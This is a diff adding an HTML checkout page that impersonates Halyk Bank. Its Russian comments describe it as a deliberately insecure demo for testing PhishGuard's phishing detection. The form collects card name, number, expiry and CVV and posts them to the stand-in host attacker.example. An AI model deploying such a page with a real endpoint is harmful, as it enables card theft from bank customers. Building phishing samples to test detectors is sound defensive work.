@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Halyk Bank Payment — Checkout</title>
+  <style>
+    :root{
+      --bg1:#0f1020;--bg2:#1a1b34;--card:#191b2e;--muted:#9fb7ff;--txt:#ffffff;
+      --accent:#6c7cff;--ok:#2ecc71;--warn:#f39c12;--danger:#e74c3c;--border:#26284a;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;min-height:100vh;color:var(--txt);
+      font-family: system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+      background: radial-gradient(1200px 600px at 20% -10%, #2d2f86 0%, transparent 60%),
+                  radial-gradient(1200px 600px at 120% 0%, #6f2da8 0%, transparent 50%),
+                  linear-gradient(180deg,var(--bg1),#141532 60%, var(--bg1));
+      display:flex;align-items:center;justify-content:center;padding:28px;
+    }
+    .shell{
+      width:100%;max-width:980px;display:grid;gap:18px;grid-template-columns: 1.1fr .9fr;
+    }
+    .brand{
+      grid-column:1/-1;background:linear-gradient(135deg,#667eea,#764ba2);
+      border-radius:14px;padding:16px 20px;display:flex;align-items:center;gap:12px;
+      box-shadow:0 10px 30px rgba(0,0,0,.25);
+    }
+    .logo{width:34px;height:34px;background:#fff1;border-radius:8px;display:grid;place-items:center;border:1px solid #ffffff33}
+    .logo::after{content:'🛡️';filter:saturate(0) brightness(1.3)}
+    .title{font-weight:700;font-size:18px}
+    .subtitle{margin-left:auto;opacity:.85}
+
+    .panel{background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:18px;box-shadow:0 8px 24px rgba(0,0,0,.25)}
+    .summary{display:grid;gap:12px}
+    .merchant{display:flex;align-items:center;gap:10px}
+    .pill{background:#ffffff12;border:1px solid #ffffff22;padding:6px 10px;border-radius:999px;font-size:12px}
+    .price{font-size:28px;font-weight:800}
+    .items{opacity:.85;font-size:13px}
+
+    .form{display:grid;gap:12px}
+    .label{font-size:12px;opacity:.85;margin-bottom:6px}
+    .field{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px 14px;color:var(--txt);width:100%}
+    .grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    .btn{cursor:pointer;border:1px solid #7a87ff44;border-radius:10px;padding:12px 16px;font-weight:700;color:#fff;background:linear-gradient(135deg,#6c7cff,#7f53ff);box-shadow:0 8px 20px rgba(108,124,255,.3)}
+    .btn:active{transform:translateY(1px)}
+    .hint{font-size:12px;color:var(--muted)}
+
+    .cards{display:flex;gap:8px;opacity:.9}
+    .cardlogo{height:18px;padding:6px 10px;border-radius:8px;border:1px solid #ffffff22;background:#ffffff10}
+
+    @media (max-width:900px){.shell{grid-template-columns:1fr}.summary{order:2}}
+  </style>
+  <!-- ВНИМАНИЕ: демо намеренно небезопасно (action ведёт на внешний http-домен) -->
+  <!-- Это нужно для демонстрации детекта фишинговых платежных форм в PhishGuard -->
+</head>
+<body>
+  <div class="shell">
+    <div class="brand">
+      <div class="logo"></div>
+      <div class="title">Halyk Bank</div>
+      <div class="subtitle">Checkout</div>
+    </div>
+
+    <div class="summary panel">
+      <div class="merchant">
+        <span class="pill">Товар</span>
+        <span class="items">Premium Subscription • 12 месяцев</span>
+      </div>
+      <div class="price">19 990 ₸</div>
+      <div class="cards">
+        <div class="cardlogo">VISA</div>
+        <div class="cardlogo">MASTERCARD</div>
+        <div class="cardlogo">MIR</div>
+      </div>
+      <div class="hint">Оплата защищена шифрованием TLS 1.2</div>
+    </div>
+
+    <div class="panel">
+      <form class="form" action="http://attacker.example/collect" method="POST">
+        <div>
+          <div class="label">Имя на карте</div>
+          <input class="field" name="name_on_card" placeholder="IVAN IVANOV" />
+        </div>
+        <div>
+          <div class="label">Номер карты</div>
+          <input class="field" name="card_number" placeholder="4111 1111 1111 1111" />
+        </div>
+        <div class="grid2">
+          <div>
+            <div class="label">Срок действия (MM/YY)</div>
+            <input class="field" name="expiry" placeholder="12/27" />
+          </div>
+          <div>
+            <div class="label">CVV / CVC</div>
+            <input class="field" name="cvv" placeholder="123" />
+          </div>
+        </div>
+        <div>
+          <button class="btn" type="submit">Оплатить 19 990 ₸</button>
+        </div>
+        <div class="hint">Нажимая «Оплатить», вы соглашаетесь с условиями использования</div>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
+
+
+
+
+
+
